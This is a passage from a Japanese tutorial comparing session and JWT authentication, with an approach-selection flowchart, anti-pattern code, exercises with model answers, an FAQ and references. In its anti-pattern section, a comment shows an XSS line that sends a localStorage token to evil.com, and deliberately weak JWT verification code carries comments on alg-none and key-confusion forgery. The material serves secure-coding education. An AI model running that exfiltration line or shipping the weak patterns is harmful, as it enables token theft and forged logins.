│    → 理由: コンプライアンス要件で即時失効が必須の場合が多い       │
│                                                             │
│  ■ IoT / CLI ツール:                                         │
│    → Device Code Flow + JWT                                  │
│    → 理由: UI がないため OAuth Device Flow が適切               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 7.2 判断フローチャート

```
判断フローチャート:

  ①モバイルネイティブアプリ？
    │
    ├─ yes → JWT + Secure Storage (Keychain/Keystore)
    │         + Refresh Token
    │
    └─ no
        │
        ②マイクロサービス間通信？
        │
        ├─ yes → JWT（ES256）+ mTLS
        │
        └─ no
            │
            ③即時失効が必須？（金融・医療・コンプライアンス）
            │
            ├─ yes → セッション方式（Redis ストア）
            │
            └─ no
                │
                ④SPA or フルスタック Web？
                │
                ├─ yes → ハイブリッド（JWT in HttpOnly Cookie）
                │         + Refresh Token Rotation
                │
                └─ no
                    │
                    ⑤サーバーサイドレンダリング（MPA）？
                    │
                    ├─ yes → セッション + Cookie
                    │
                    └─ no → 要件を詳細分析して選定
```

---

## 8. アンチパターン

### 8.1 NG: localStorage にトークンを保存する

```typescript
// NG: XSS で窃取可能
async function loginBad(email: string, password: string) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  });
  const { token } = await response.json();

  // NG: localStorage に保存 → XSS で簡単に窃取される
  localStorage.setItem('access_token', token);
}

// XSS 攻撃者が以下のスクリプトを注入するだけで窃取可能:
// const token = localStorage.getItem('access_token');
// fetch('https://evil.com/steal', { method: 'POST', body: token });
```

```typescript
// OK: HttpOnly Cookie に保存（サーバー側で設定）
async function loginGood(email: string, password: string) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
    credentials: 'include', // Cookie を受け取る
  });

  if (!response.ok) throw new Error('Login failed');
  // トークンは HttpOnly Cookie でサーバーが設定済み
  // JavaScript からは見えない → XSS で窃取不可能
  return response.json(); // ユーザー情報のみ返却
}
```

### 8.2 NG: JWT にアルゴリズム制限を設定しない

```typescript
// NG: アルゴリズムを検証しない → alg: "none" 攻撃に脆弱
import jwt from 'jsonwebtoken';

function verifyTokenBad(token: string) {
  // NG: algorithms を指定していない
  return jwt.verify(token, publicKey);
  // 攻撃者が alg を "none" に変更すると署名なしで通る
  // 攻撃者が alg を "HS256" に変更し、公開鍵を秘密鍵として使うと偽造できる
}
```

```typescript
// OK: アルゴリズムを明示的に制限
import { jwtVerify } from 'jose';

async function verifyTokenGood(token: string) {
  const { payload } = await jwtVerify(token, publicKey, {
    algorithms: ['ES256'],          // 許可するアルゴリズムを限定
    issuer: 'https://auth.example.com',
    audience: 'https://api.example.com',
  });
  return payload;
}
```

### 8.3 NG: JWT に機密情報を含める

```typescript
// NG: JWT ペイロードに機密情報
const badPayload = {
  sub: 'user_123',
  email: 'alice@example.com',
  password: 'hashed_password_here',  // NG: パスワードハッシュ
  ssn: '123-45-6789',               // NG: 社会保障番号
  creditCard: '4111-1111-1111-1111', // NG: クレジットカード番号
  internalNotes: 'VIP customer',     // NG: 内部メモ
};
// JWT は署名されるが暗号化されない → Base64URL デコードで誰でも読める
```

```typescript
// OK: 必要最小限の情報のみ
const goodPayload = {
  sub: 'user_123',       // ユーザーID
  role: 'admin',         // ロール（認可に必要）
  org_id: 'org_456',     // 組織ID（マルチテナント用）
  // exp, iat, iss, aud はライブラリが設定
};
// 詳細情報が必要な場合は /userinfo API で取得
```

### 8.4 NG: セッション ID に予測可能な値を使う

```typescript
// NG: 予測可能なセッション ID
function generateSessionIdBad(): string {
  // NG: シーケンシャルな ID → 推測可能
  return `session_${Date.now()}`;
  // NG: Math.random() → 暗号的に安全ではない
  // return `session_${Math.random().toString(36)}`;
}
```

```typescript
// OK: 暗号的に安全なランダム値
import crypto from 'crypto';

function generateSessionIdGood(): string {
  // 32バイト = 256ビットの暗号ランダム値
  return crypto.randomBytes(32).toString('hex');
  // 結果例: "a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1"
}
```

---

## 9. 実践演習

### 演習1: 基礎 - セッション方式とトークン方式の識別

以下の HTTP リクエスト/レスポンスを見て、それぞれがセッション方式かトークン方式かを判別し、その理由を説明せよ。

**ケース A:**
```
POST /api/login HTTP/1.1
Content-Type: application/json

{"email": "alice@example.com", "password": "secret123"}

---
HTTP/1.1 200 OK
Set-Cookie: sid=a1b2c3d4e5; HttpOnly; Secure; SameSite=Lax

{"message": "Login successful"}
```

**ケース B:**
```
POST /api/login HTTP/1.1
Content-Type: application/json

{"email": "alice@example.com", "password": "secret123"}

---
HTTP/1.1 200 OK
Content-Type: application/json

{"access_token": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9...", "token_type": "Bearer", "expires_in": 900}
```

**ケース C:**
```
POST /api/login HTTP/1.1
Content-Type: application/json

{"email": "alice@example.com", "password": "secret123"}

---
HTTP/1.1 200 OK
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Secure; SameSite=Lax

{"message": "Login successful"}
```

<details>
<summary>模範解答</summary>

**ケース A: セッション方式**
- 理由: `Set-Cookie: sid=a1b2c3d4e5` でランダムなセッション ID を Cookie に設定している
- セッション ID は単なるポインタであり、実際の認証データはサーバー側に保存されている
- レスポンスボディにトークンは含まれていない

**ケース B: トークン方式（純粋な JWT）**
- 理由: レスポンスボディに `access_token`（JWT 形式）が返されている
- `token_type: "Bearer"` は Authorization ヘッダーで送信することを示す
- `expires_in: 900` は900秒（15分）の有効期限
- Cookie は使用されていない → クライアントがトークンを管理

**ケース C: ハイブリッド方式**
- 理由: JWT 形式のトークン（`eyJ...`）が HttpOnly Cookie に設定されている
- JWT の自己完結型検証 + Cookie の XSS 耐性を組み合わせている
- レスポンスボディにトークンは含まれない（JavaScript からアクセス不可）
- 最も推奨されるアプローチ

</details>

### 演習2: 応用 - Refresh Token Rotation の実装

以下の仕様を満たす Refresh Token Rotation の仕組みを実装せよ。

**仕様:**
1. Access Token の有効期限は 15分
2. Refresh Token の有効期限は 7日
3. Refresh Token を使用するたびに新しい Refresh Token を発行する
4. 使用済みの Refresh Token が再利用されたら、同一ファミリーの全トークンを無効化する
5. Refresh Token はハッシュ化して DB に保存する

<details>
<summary>模範解答</summary>

```typescript
import crypto from 'crypto';
import { SignJWT, jwtVerify } from 'jose';

// DB スキーマ（Prisma）
// model RefreshToken {
//   id        String   @id @default(cuid())
//   token     String   @unique    // SHA-256 ハッシュ
//   userId    String
//   family    String              // トークンファミリー
//   used      Boolean  @default(false)
//   expiresAt DateTime
//   createdAt DateTime @default(now())
//   user      User     @relation(fields: [userId], references: [id])
//   @@index([family])
//   @@index([userId])
// }

const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET!);

class TokenService {
  // Access Token 発行
  async issueAccessToken(userId: string, role: string): Promise<string> {
    return new SignJWT({ sub: userId, role })
      .setProtectedHeader({ alg: 'HS256' })
      .setIssuedAt()
      .setExpirationTime('15m')
      .setJti(crypto.randomUUID())
      .sign(JWT_SECRET);
  }

  // Refresh Token 発行
  async issueRefreshToken(userId: string, family?: string): Promise<string> {
    const rawToken = crypto.randomBytes(32).toString('hex');
    const hashedToken = this.hashToken(rawToken);

    await prisma.refreshToken.create({
      data: {
        token: hashedToken,
        userId,
        family: family || crypto.randomUUID(),
        used: false,
        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      },
    });

    return rawToken;
  }

  // トークンリフレッシュ（Rotation 付き）
  async refresh(rawRefreshToken: string): Promise<{
    accessToken: string;
    refreshToken: string;
  }> {
    const hashedToken = this.hashToken(rawRefreshToken);

    const record = await prisma.refreshToken.findUnique({
      where: { token: hashedToken },
      include: { user: true },
    });

    // 存在しない or 期限切れ
    if (!record || record.expiresAt < new Date()) {
      throw new Error('Invalid refresh token');
    }

    // 再利用検知 → 全ファミリー無効化
    if (record.used) {
      await prisma.refreshToken.deleteMany({
        where: { family: record.family },
      });
      console.warn(`[SECURITY] Refresh token reuse detected for user ${record.userId}`);
      throw new Error('Token reuse detected - all sessions in family revoked');
    }

    // 使用済みにマーク
    await prisma.refreshToken.update({
      where: { token: hashedToken },
      data: { used: true },
    });

    // 新しいトークンペアを発行
    const accessToken = await this.issueAccessToken(record.userId, record.user.role);
    const refreshToken = await this.issueRefreshToken(record.userId, record.family);

    return { accessToken, refreshToken };
  }

  // ログアウト（ファミリー全体を無効化）
  async revokeFamily(rawRefreshToken: string): Promise<void> {
    const hashedToken = this.hashToken(rawRefreshToken);
    const record = await prisma.refreshToken.findUnique({
      where: { token: hashedToken },
    });

    if (record) {
      await prisma.refreshToken.deleteMany({
        where: { family: record.family },
      });
    }
  }

  // 全セッション無効化
  async revokeAllForUser(userId: string): Promise<void> {
    await prisma.refreshToken.deleteMany({ where: { userId } });
  }

  private hashToken(token: string): string {
    return crypto.createHash('sha256').update(token).digest('hex');
  }
}
```

**設計のポイント:**

1. **ファミリーID**: 同一ログインセッションから生成された全 Refresh Token を追跡
2. **再利用検知**: `used` フラグで使用済みトークンの再利用を検知
3. **ハッシュ化保存**: DB に保存するのはハッシュ値のみ（DB 漏洩時の被害軽減）
4. **ファミリー全体の無効化**: 1つのトークンが不正使用されたら関連する全トークンを削除

</details>

### 演習3: 発展 - セキュリティ要件に基づく認証方式設計

以下のシステム要件に基づき、最適な認証方式を設計し、その理由を技術的に説明せよ。

**システム要件:**
- 医療系 SaaS アプリケーション（HIPAA 準拠が必要）
- フロントエンド: React SPA
- バックエンド: マイクロサービス（3つのサービス）
- モバイルアプリ: iOS / Android
- 要件: セッション即時無効化、監査ログ、15分の無操作タイムアウト
- ユーザー規模: 1万人
- 可用性: 99.9%

設計書として以下を含めること:
1. 認証方式の選定とその理由
2. トークン/セッションの保存場所
3. 有効期限設計
4. 失効戦略
5. スケーリング戦略

<details>
<summary>模範解答</summary>

### 1. 認証方式の選定

**ハイブリッド方式（JWT + サーバーサイド検証）を採用する。**

理由:
- HIPAA 準拠には即時失効が必須 → 純粋な JWT（ステートレス）だけでは不十分
- マイクロサービス間通信には JWT の自己完結型検証が効率的
- モバイル対応には JWT ベースのフローが適切

具体的な設計:
```
[Web SPA] → BFF（Backend for Frontend）→ [マイクロサービス群]
                                           ├─ Patient Service
                                           ├─ Appointment Service
                                           └─ Records Service

[Mobile App] → API Gateway → [マイクロサービス群]
```

### 2. トークン/セッションの保存場所

**Web SPA:**
- Access Token: BFF の HttpOnly Cookie に JWT を保存
- Refresh Token: HttpOnly Cookie（Strict, path 限定）
- SPA 自体はトークンを保持しない → XSS 耐性最大化

**モバイルアプリ:**
- Access Token: iOS Keychain / Android Keystore
- Refresh Token: 同上（OS レベルのセキュアストレージ）

**マイクロサービス間:**
- 短命 JWT（5分）で認証
- mTLS を併用して通信路も保護

### 3. 有効期限設計

```
Access Token:   15分（HIPAA の無操作タイムアウト要件に合致）
Refresh Token:  8時間（業務時間内）
                ※ 「ログイン状態維持」オプションは提供しない（HIPAA 要件）
```

### 4. 失効戦略

**Redis ベースの Token Version + ブラックリスト併用:**
```
通常の失効:     短い有効期限（15分）で自然に失効
即時失効:       Redis ブラックリスト（jti ベース）
全セッション:    Token Version インクリメント（DB + Redis キャッシュ）
```

**監査ログ:**
```
ログイン/ログアウト/トークンリフレッシュ/失効/不正アクセス検知
→ 全て監査ログに記録（DynamoDB or CloudWatch Logs）
→ HIPAA 要件: 最低6年間保持
```

### 5. スケーリング戦略

```
Redis:         Redis Cluster（3ノード、マルチAZ）
               → ブラックリスト + Token Version キャッシュ
               → 99.9% 可用性を保証

BFF:           水平スケーリング（ECS/EKS、最低3インスタンス）
               → JWT 検証はステートレス、Redis のみ参照

API Gateway:   AWS API Gateway or Kong
               → JWT 検証をゲートウェイレベルで実施
               → 各マイクロサービスの負荷を軽減

鍵管理:        AWS KMS で署名鍵を管理
               → ES256（楕円曲線暗号）
               → 90日ごとに自動ローテーション
```

**この設計が最適な理由:**
1. HIPAA の即時失効要件を Redis ブラックリストで満たす
2. マイクロサービスの独立性を JWT の自己完結型検証で確保
3. Web の XSS 耐性を BFF + HttpOnly Cookie で最大化
4. モバイル対応を JWT + Secure Storage で実現
5. 99.9% 可用性を Redis Cluster + 水平スケーリングで達成

</details>

---

## 10. FAQ

### Q1: セッション方式と JWT、どちらが「安全」なのか？

**A:** 「どちらが安全か」は一概に言えない。セキュリティの性質が異なる。

- **セッション方式**は「即時失効」に強く、**管理の安全性**が高い
- **トークン方式**は「改ざん検知」に強く、**伝送の安全性**が高い

実際には、保存場所（HttpOnly Cookie vs localStorage）や実装品質がセキュリティを決定する。HttpOnly Cookie に JWT を保存するハイブリッドが、両方の利点を活かせる。

### Q2: JWT の有効期限は何分が最適か？

**A:** アプリケーションの性質による。

| アプリ種別 | Access Token | Refresh Token |
|-----------|-------------|---------------|
| 一般的な Web | 15分 | 7日 |
| 金融・医療 | 5-15分 | 8時間 |
| ソーシャルメディア | 1時間 | 30日 |
| IoT デバイス | 1時間 | 90日 |
| マイクロサービス間 | 5分 | なし |

短すぎるとリフレッシュが頻発し UX が悪化する。長すぎるとセキュリティリスクが増大する。15分は一般的に良いバランスとされている。

### Q3: Refresh Token は本当に必要か？

**A:** Access Token だけでは長期セッションを安全に維持できないため、ほぼ必須。

Refresh Token なしの場合:
- Access Token の有効期限を長くする → 窃取時のリスク増大
- Access Token の有効期限を短くする → ユーザーが頻繁に再ログイン

Refresh Token があれば:
- Access Token を短命にしてセキュリティ確保
- Refresh Token で透過的にトークン更新
- Rotation で Refresh Token の窃取も検知可能

### Q4: SameSite Cookie だけで CSRF は防げるか？

**A:** SameSite=Lax は主要な CSRF 攻撃を防ぐが、完全ではない。

防げるもの:
- `<form method="POST">` の自動送信
- `<img>`, `<iframe>` からのリクエスト
- `fetch()` / `XMLHttpRequest` のクロスサイトリクエスト

防げないもの:
- サブドメインからの攻撃（同一サイトと見なされる）
- GET リクエストでの状態変更（API 設計の問題）
- SameSite 非対応の古いブラウザ

推奨: SameSite=Lax + Origin ヘッダー検証の組み合わせ。

### Q5: セッションストアが落ちたらどうなるか？

**A:** セッション方式ではストアが SPOF（単一障害点）になる。対策:

1. **Redis Sentinel**: 自動フェイルオーバーで高可用性（99.99%）
2. **Redis Cluster**: 水平スケーリング + 自動シャーディング
3. **マルチリージョン**: Active-Active レプリケーション
4. **フォールバック**: ストア障害時はグレースフルに新しいログインを要求

JWT 方式ならストア不要だが、ブラックリスト/Token Version のために Redis を使う場合は同じ問題が発生する。完全なステートレスは「即時失効なし」のトレードオフを受け入れる必要がある。

---

## まとめ

### 方式別の総合比較表

| 方式 | 最適な用途 | セキュリティ | スケール | 実装難度 | 注意点 |
|------|----------|------------|---------|---------|--------|
| セッション | MPA、即時失効が必須 | ○ 高い | △ ストア依存 | 低い | CSRF対策必須、ストア管理 |
| JWT（Bearer） | モバイル、API間通信 | △ 保存場所依存 | ◎ 容易 | 中程度 | 即時失効困難、サイズ大 |
| JWT + Cookie | Next.js、SPA | ◎ 最も安全 | ○ 良い | 中程度 | Cookie サイズ上限、同一ドメイン |
| Refresh Token | 長期セッション維持 | ○ Rotation前提 | ○ 良い | 高い | ローテーション必須 |

### 選定の原則

```
1. ブラウザアプリでは HttpOnly Cookie が最優先
2. localStorage にトークンを保存しない
3. Access Token は短命（15分以下）にする
4. Refresh Token Rotation を必ず実装する
5. アルゴリズムの許可リストを明示する
6. 機密情報を JWT ペイロードに含めない
7. 迷ったらハイブリッド（JWT in HttpOnly Cookie）を選ぶ
```

---

## 次に読むべきガイド

| 次のトピック | リンク |
|-------------|--------|
| Cookie とセッション管理 | [01-session-auth/00-cookie-and-session.md](../01-session-auth/00-cookie-and-session.md) |
| セッションストア | [01-session-auth/01-session-store.md](../01-session-auth/01-session-store.md) |
| CSRF 防御 | [01-session-auth/02-csrf-protection.md](../01-session-auth/02-csrf-protection.md) |
| JWT 詳解 | [02-token-auth/00-jwt-deep-dive.md](../02-token-auth/00-jwt-deep-dive.md) |
| OAuth 2.0 フロー | [02-token-auth/01-oauth2-flows.md](../02-token-auth/01-oauth2-flows.md) |
| セキュリティ基礎 | [security-fundamentals/00-basics/](../../security-fundamentals/docs/00-basics/) |

---

## 参考文献

1. OWASP. "Session Management Cheat Sheet." cheatsheetseries.owasp.org, 2024.
2. OWASP. "JSON Web Token Cheat Sheet." cheatsheetseries.owasp.org, 2024.
3. Auth0. "Token Storage." auth0.com/docs, 2024.
4. Auth0. "Token Best Practices." auth0.com/docs, 2024.
5. RFC 6750. "The OAuth 2.0 Authorization Framework: Bearer Token Usage." IETF, 2012.
6. RFC 7519. "JSON Web Token (JWT)." IETF, 2015.
7. Okta. "Why You Should Not Use localStorage for Authentication Tokens." developer.okta.com, 2023.
8. Philippe De Ryck. "The Pitfalls of OAuth and OIDC in SPAs." pragmaticwebsecurity.com, 2023.
